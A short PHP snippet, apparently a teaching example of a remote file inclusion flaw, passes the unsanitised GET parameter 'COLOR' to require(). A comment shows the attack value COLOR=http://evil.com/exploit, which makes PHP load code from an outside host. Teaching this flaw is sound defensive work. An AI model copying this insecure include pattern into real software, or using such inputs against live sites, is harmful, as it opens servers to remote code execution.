<?php
$color = 'blue';
if (isset( $_GET['COLOR'] ) )
	$color = $_GET['COLOR'];
require( $color . '.php' );

// The example might be read as only color-files like blue.php and red.php could be loaded, while attackers might provide COLOR=http://evil.com/exploit causing PHP to load the external file.
